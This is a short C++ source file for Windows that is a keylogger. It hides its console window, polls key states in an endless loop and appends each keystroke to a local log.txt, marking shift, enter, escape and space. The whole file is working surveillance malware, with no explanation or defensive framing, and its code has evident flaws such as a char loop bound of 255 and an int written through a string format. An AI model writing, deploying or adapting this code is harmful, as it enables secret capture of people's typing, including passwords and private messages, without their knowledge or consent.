#include <iostream>
#include <Windows.h>

using namespace std;

int Save(int _key, char *file);

int main() {
 	
 	FreeConsole();
	char i;

	while (true) 
	{
 		Sleep(100);
 		for (i = 8; i <= 255; i++) {
 			if (GetAsyncKeyState(i) == -32767) {
				Save(i, "log.txt");
 			}
 		}
 	}
 	return 0;
}


int Save(int _key, char *file) {

	cout << _key << endl;
	Sleep(100);
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen(file, "a+");

	if (_key == VK_LSHIFT)
		fprintf(OUTPUT_FILE, "%s", "MAJ+ ");
	else if (_key == VK_RETURN)
		fprintf(OUTPUT_FILE, "%s", "\n");
	else if (_key == VK_ESCAPE)
		fprintf(OUTPUT_FILE, "%s", "[ESC]");
	else if (_key == VK_SPACE)
		fprintf(OUTPUT_FILE, "%s", " ");
	else
		fprintf(OUTPUT_FILE, "%s", &_key);

	fclose(OUTPUT_FILE);

	return 0;
}
